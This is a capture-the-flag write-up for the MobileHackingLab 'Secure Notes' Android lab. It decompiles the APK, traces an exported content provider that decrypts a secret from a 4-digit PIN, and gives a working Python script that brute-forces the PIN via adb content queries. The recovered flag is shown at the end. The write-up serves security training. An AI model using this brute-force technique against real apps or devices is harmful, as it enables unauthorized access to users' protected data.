The Challenge: https://www.mobilehackinglab.com/course/lab-secure-notes

# Download the APK 
`$ adb connect 10.11.1.1:5001`
`$ adb shell pm list packages |grep secure`
```
package:com.mobilehackinglab.securenotes
```
`$ adb shell pm path com.mobilehackinglab.securenotes`
`$ adb pull /data/app/~~vL5HrwM6HzeeMs5WqYjuzw==/com.mobilehackinglab.securenotes-EBYsMZZgVsmiwn1oyY2KWA==/base.apk

# Static Analysis
## Decompile
`$ apktool d base.apk`
```
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.7.0-dirty on base.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Baksmaling classes4.dex...
I: Baksmaling classes3.dex...
I: Baksmaling classes2.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
```

**Looking for some interest things**
`$ cat assets/config.properties `
```bash
encryptedSecret=bTjBHijMAVQX+CoyFbDPJXRUSHcTyzGaie3OgVqvK5w=
salt=m2UvPXkvte7fygEeMr0WUg==
iv=L15Je6YfY5owgIckR9R3DQ==
iterationCount=10000
```
## Code Analysis
**Interesting config of activity (android:exported="true") in AndroidManifest.xml:**
```xml
        <provider android:name="com.mobilehackinglab.securenotes.SecretDataProvider" android:enabled="true" android:exported="true" android:authorities="com.mobilehackinglab.securenotes.secretprovider"/> 
        <activity android:name="com.mobilehackinglab.securenotes.MainActivity" android:exported="true">  
            <intent-filter>  
                <action android:name="android.intent.action.MAIN"/>  
                <category android:name="android.intent.category.LAUNCHER"/>  
            </intent-filter>  
        </activity>
```

Note:
- `com.mobilehackinglab.securenotes.MainActivity` is a main activity of this application
- `com.mobilehackinglab.securenotes.secretprovider` is a content provider that allow us to query any data of this application.

**Looking to the MainActivity, there's a method called as onCreate()**
```java
public void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());  
        Intrinsics.checkNotNullExpressionValue(inflate, "inflate(...)");  
        this.binding = inflate;  
        ActivityMainBinding activityMainBinding = null;  
        if (inflate == null) {  
            Intrinsics.throwUninitializedPropertyAccessException("binding");  
            inflate = null;  
        }  
        setContentView(inflate.getRoot());  
        ActivityMainBinding activityMainBinding2 = this.binding;  
        if (activityMainBinding2 == null) {  
            Intrinsics.throwUninitializedPropertyAccessException("binding");  
        } else {  
            activityMainBinding = activityMainBinding2;  
        }  
        activityMainBinding.submitPinButton.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.securenotes.MainActivity$$ExternalSyntheticLambda0  
            @Override // android.view.View.OnClickListener  
            public final void onClick(View view) {  
                MainActivity.onCreate$lambda$0(MainActivity.this, view);  
            }  
        });  
    }
```
That **onCreate()** said when someone clicks something, then the **onCreate$lambda$0()** will be called.

```java
    public static final void onCreate$lambda$0(MainActivity this$0, View it) {  
        Intrinsics.checkNotNullParameter(this$0, "this$0");  
        ActivityMainBinding activityMainBinding = this$0.binding;  
        if (activityMainBinding == null) {  
            Intrinsics.throwUninitializedPropertyAccessException("binding");  
            activityMainBinding = null;  
        }  
        String enteredPin = activityMainBinding.pinEditText.getText().toString();  
        this$0.querySecretProvider(enteredPin);  
    }
```
In the **onCreate$lambda$0()** we can see that our entered pin takes in the `enteredPin` variable, then call the **querySecretProvider()** method with the `enteredPin` as its argument.

```
private final void querySecretProvider(java.lang.String r9) {  
        /*  
            r8 = this;  
            java.lang.String r0 = "content://com.mobilehackinglab.securenotes.secretprovider"  
            android.net.Uri r0 = android.net.Uri.parse(r0)  
            java.lang.StringBuilder r1 = new java.lang.StringBuilder  
            r1.<init>()  
            java.lang.String r2 = "pin="  
            java.lang.StringBuilder r1 = r1.append(r2)  
            java.lang.StringBuilder r1 = r1.append(r9)  
            java.lang.String r7 = r1.toString()  
            android.content.ContentResolver r1 = r8.getContentResolver()  
            r3 = 0  
            r5 = 0  
            r6 = 0  
            r2 = r0  
            r4 = r7  
            android.database.Cursor r1 = r1.query(r2, r3, r4, r5, r6)  
            r2 = 0  
            if (r1 == 0) goto L63  
            r3 = r1  
            r4 = 0  
            boolean r3 = r3.moveToFirst()  
            if (r3 == 0) goto L33  
            r3 = r1  
            goto L34  
        L33:  
            r3 = r2  
        L34:  
            if (r3 == 0) goto L63  
        L37:  
            java.lang.String r4 = "Secret"  
            int r3 = r3.getColumnIndex(r4)  
            java.lang.Integer r3 = java.lang.Integer.valueOf(r3)  
            r4 = r3  
            java.lang.Number r4 = (java.lang.Number) r4  
            int r4 = r4.intValue()  
            r5 = 0  
            r6 = -1  
            if (r4 == r6) goto L4f  
            r6 = 1  
            goto L50  
        L4f:  
            r6 = 0  
        L50:  
            if (r6 == 0) goto L53  
            goto L54  
        L53:  
            r3 = r2  
        L54:  
            if (r3 == 0) goto L63  
        L57:  
            java.lang.Number r3 = (java.lang.Number) r3  
            int r3 = r3.intValue()  
            r4 = 0  
            java.lang.String r3 = r1.getString(r3)  
            goto L64  
        L63:  
            r3 = r2  
        L64:  
            if (r3 != 0) goto L68  
            java.lang.String r3 = "[ERROR: Incorrect PIN]"  
        L68:  
            com.mobilehackinglab.securenotes.databinding.ActivityMainBinding r4 = r8.binding  
            if (r4 != 0) goto L73  
            java.lang.String r4 = "binding"  
            kotlin.jvm.internal.Intrinsics.throwUninitializedPropertyAccessException(r4)  
            goto L74  
        L73:  
            r2 = r4  
        L74:  
            android.widget.TextView r2 = r2.resultTextView  
            r4 = r3  
            java.lang.CharSequence r4 = (java.lang.CharSequence) r4  
            r2.setText(r4)  
            if (r1 == 0) goto L81  
            r1.close()  
        L81:  
            return  
        */  
        throw new UnsupportedOperationException("Method not decompiled: com.mobilehackinglab.securenotes.MainActivity.querySecretProvider(java.lang.String):void");  
    }
```
**Seems like it's not properly decompiled.** 

### Analysis the querySecretProvider() method
**But let's say:**
```java
java.lang.String r0 = "content://com.mobilehackinglab.securenotes.secretprovider"
android.net.Uri r0 = android.net.Uri.parse(r0)
```
This code defines a content URI (`r0`) pointing to a content provider. It then parses this string into a `Uri` object.

```java
java.lang.StringBuilder r1 = new java.lang.StringBuilder()
java.lang.String r2 = "pin="
java.lang.StringBuilder r1 = r1.append(r2)
java.lang.StringBuilder r1 = r1.append(r9)
java.lang.String r7 = r1.toString()
```
This section builds a query string by appending the `"pin="` prefix and the value of the parameter `r9` (presumably a PIN) to it.

```java
android.content.ContentResolver r1 = r8.getContentResolver()
android.database.Cursor r1 = r1.query(r0, r3, r4, r5, r6)
```
The content resolver is obtained from the context (`r8`) and used to execute a query on the content provider using the previously defined URI (`r0`) and the constructed query string (`r7`).

```java
if (r1 == 0) goto L63
boolean r3 = r3.moveToFirst()
if (r3 == 0) goto L33  
goto L34
```
The code checks if the cursor is not null and if it successfully moved to the first row. 

```java
java.lang.String r4 = "Secret"  
int r3 = r3.getColumnIndex(r4)  
java.lang.Integer r3 = java.lang.Integer.valueOf(r3)  
r4 = r3  
java.lang.Number r4 = (java.lang.Number) r4  
int r4 = r4.intValue()  
r5 = 0  
r6 = -1  
if (r4 == r6) goto L4f  
r6 = 1  
goto L50
```
If so, it extracts the value of the column named "Secret" from the cursor.

```java
if (r3 != 0) goto L68  
java.lang.String r3 = "[ERROR: Incorrect PIN]"
```
If the PIN is incorrect or there's another error, an appropriate error message is generated.

```java
android.widget.TextView r2 = r2.resultTextView  
r4 = r3  
java.lang.CharSequence r4 = (java.lang.CharSequence) r4  
r2.setText(r4)  
if (r1 == 0) goto L81  
r1.close()
```
The result of the query is displayed in a `TextView` (`resultTextView`) of the UI.

#### Conclusion
This **querySecretProvider()** method seems to query a content provider for secret data based on a provided PIN, and updates the UI accordingly. If an error occurs, it displays an appropriate message.

### Looking for the SecretDataProvider
The **onCreate()** method:
```java
    public boolean onCreate() {  
        AssetManager assets;  
        InputStream open;  
        Properties properties = new Properties();  
        Context context = getContext();  
        if (context != null && (assets = context.getAssets()) != null && (open = assets.open("config.properties")) != null) {  
            InputStream inputStream = open;  
            try {  
                InputStream it = inputStream;  
                properties.load(it);  
                byte[] decode = Base64.decode(properties.getProperty("encryptedSecret"), 0);  
                Intrinsics.checkNotNullExpressionValue(decode, "decode(...)");  
                this.encryptedSecret = decode;  
                byte[] decode2 = Base64.decode(properties.getProperty("salt"), 0);  
                Intrinsics.checkNotNullExpressionValue(decode2, "decode(...)");  
                this.salt = decode2;  
                byte[] decode3 = Base64.decode(properties.getProperty("iv"), 0);  
                Intrinsics.checkNotNullExpressionValue(decode3, "decode(...)");  
                this.iv = decode3;  
                String property = properties.getProperty("iterationCount");  
                Intrinsics.checkNotNullExpressionValue(property, "getProperty(...)");  
                this.iterationCount = Integer.parseInt(property);  
                Unit unit = Unit.INSTANCE;  
                CloseableKt.closeFinally(inputStream, null);  
                return true;  
            } catch (Throwable th) {  
                try {  
                    throw th;  
                } catch (Throwable th2) {  
                    CloseableKt.closeFinally(inputStream, th);  
                    throw th2;  
                }  
            }  
        }  
        return true;  
    }
```
It said that the **onCreate()** method seems to be loading some configuration properties from a file named `config.properties` and decode them from `Base64`, then assigning them to the variables.

The **query()** method:
```java
    @Override // android.content.ContentProvider  
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {  
        Object m130constructorimpl;  
        Intrinsics.checkNotNullParameter(uri, "uri");  
        MatrixCursor matrixCursor = null;  
        if (selection == null || !StringsKt.startsWith$default(selection, "pin=", false, 2, (Object) null)) {  
            return null;  
        }  
        String removePrefix = StringsKt.removePrefix(selection, (CharSequence) "pin=");  
        try {  
            StringCompanionObject stringCompanionObject = StringCompanionObject.INSTANCE;  
            String format = String.format("%04d", Arrays.copyOf(new Object[]{Integer.valueOf(Integer.parseInt(removePrefix))}, 1));  
            Intrinsics.checkNotNullExpressionValue(format, "format(format, *args)");  
            try {  
                Result.Companion companion = Result.Companion;  
                SecretDataProvider $this$query_u24lambda_u241 = this;  
                m130constructorimpl = Result.m130constructorimpl($this$query_u24lambda_u241.decryptSecret(format));  
            } catch (Throwable th) {  
                Result.Companion companion2 = Result.Companion;  
                m130constructorimpl = Result.m130constructorimpl(ResultKt.createFailure(th));  
            }  
            if (Result.m136isFailureimpl(m130constructorimpl)) {  
                m130constructorimpl = null;  
            }  
            String secret = (String) m130constructorimpl;  
            if (secret != null) {  
                MatrixCursor $this$query_u24lambda_u243_u24lambda_u242 = new MatrixCursor(new String[]{"Secret"});  
                $this$query_u24lambda_u243_u24lambda_u242.addRow(new String[]{secret});  
                matrixCursor = $this$query_u24lambda_u243_u24lambda_u242;  
            }  
            return matrixCursor;  
        } catch (NumberFormatException e) {  
            return null;  
        }  
    }
```
This method seems to handle queries to the content provider where the `selection` is not null and starts with string `"pin="`. Then it will remove the string `pin=` from the `selection` variable (`removePrefix`) so the remaining string is formatted as 4 digit PIN. Then call the **decryptSecret()** method.

```java
    private final String decryptSecret(String pin) {  
        try {  
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");  
            SecretKeySpec secretKeySpec = new SecretKeySpec(generateKeyFromPin(pin), "AES");  
            byte[] bArr = this.iv;  
            if (bArr == null) {  
                Intrinsics.throwUninitializedPropertyAccessException("iv");  
                bArr = null;  
            }  
            IvParameterSpec ivParameterSpec = new IvParameterSpec(bArr);  
            cipher.init(2, secretKeySpec, ivParameterSpec);  
            byte[] bArr2 = this.encryptedSecret;  
            if (bArr2 == null) {  
                Intrinsics.throwUninitializedPropertyAccessException("encryptedSecret");  
                bArr2 = null;  
            }  
            byte[] decryptedBytes = cipher.doFinal(bArr2);  
            Intrinsics.checkNotNull(decryptedBytes);  
            return new String(decryptedBytes, Charsets.UTF_8);  
        } catch (Exception e) {  
            return null;  
        }  
    }
```
The **decryptSecret()** method contains a `secret` decryption using the provided PIN and returns it as a string. If an error occurs during the decryption process, it returns null.

# Pre-Exploitation

```
Since the com.mobilehackinglab.securenotes.secretprovider is an exported content provider, then let's try to abuse the content://com.mobilehackinglab.securenotes.secretprovider to bruteforce the legitimate PIN. 
```

**Try to direct call the content query with adb**
`$ adb shell "content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where pin=1111"`
```
No result found.
```

# Exploitation
Create a python script to BruteForce a PIN:
```python
import subprocess
from multiprocessing import Pool
  
# Function to execute the ADB command for a given PIN
def execute_command(pin):
	pin_str = str(pin).zfill(4) # Convert PIN to 4-digit string format
	command = f'adb shell "content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where pin={pin_str}"'
	try:
		output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
		print(f'PIN {pin_str} found: {output}')
	except subprocess.CalledProcessError as e:
		# Handle command execution errors (e.g., PIN not found)
		pass

if __name__ == "__main__":
	# Number of processes to use (adjust as needed based on CPU cores)
	num_processes = 4

	# PIN range (0000 to 9999)
	pin_range = range(10000)
  
	# Create a pool of processes
	with Pool(num_processes) as pool:
		# Map the execute_command function to the PIN range
		pool.map(execute_command, pin_range)

	print('Bruteforce complete.')
```

Then run it:
`$ python snpin_force.py`
![[SN_Flag.png]]

`$ adb shell "content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where pin=2580"`
```
Row: 0 Secret=CTF{D1d_y0u_gu3ss_1t!1?}
```